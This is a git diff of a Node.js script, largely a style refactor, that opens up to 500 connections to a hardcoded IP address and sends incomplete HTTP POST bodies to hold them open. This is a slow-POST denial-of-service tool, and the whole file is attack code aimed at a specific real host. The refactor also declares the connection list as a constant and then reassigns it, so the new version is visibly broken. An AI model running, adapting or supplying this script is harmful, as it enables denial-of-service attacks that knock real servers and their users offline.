@@ -1,10 +1,12 @@
-var net = require("net");
+// TODO: make host and port configurable with arguments 
 
-var maxConnections = 500;
-var connections = [];
+const net = require("net");
 
-var host = "68.183.143.138";
-var port = 3000;
+const maxConnections = 500;
+const connections = [];
+
+const host = "68.183.143.138";
+const port = 3000;
 
 function Connection(h, p) {
     this.state = "active";
@@ -15,10 +17,10 @@ function Connection(h, p) {
 
         this.client.write(
             "POST / HTTP/1.1\r\nHost: " +
-                host +
-                "\r\n" +
-                "Content-Type: application/x-www-form-urlenconded\r\n" +
-                "Content-Length: 385\r\n\r\nvx=321&d1=fire&l"
+            host +
+            "\r\n" +
+            "Content-Type: application/x-www-form-urlenconded\r\n" +
+            "Content-Length: 385\r\n\r\nvx=321&d1=fire&l"
         );
 
         process.stdout.write("Written.\n");
@@ -28,15 +30,15 @@ function Connection(h, p) {
         this.client.end();
     });
     this.client.on("end", () => {
-        var d = Date.now() - this.t;
+        const d = Date.now() - this.t;
         this.state = "ended";
 
         console.log(
             "\t-Disconnected (duration: " +
-                (d / 1000).toFixed(3) +
-                " seconds, remaining open: " +
-                connections.length +
-                ")."
+            (d / 1000).toFixed(3) +
+            " seconds, remaining open: " +
+            connections.length +
+            ")."
         );
     });
     this.client.on("error", () => {
@@ -47,7 +49,7 @@ function Connection(h, p) {
 }
 
 setInterval(() => {
-    var notify = false;
+    let notify = false;
 
     // Add another connection if we haven't reached
     // our max:
@@ -57,8 +59,8 @@ setInterval(() => {
     }
 
     // Remove dead connections
-    connections = connections.filter(function(v) {
-        return v.state == "active";
+    connections = connections.filter(function (v) {
+        return v.state === "active";
     });
 
     if (notify) {
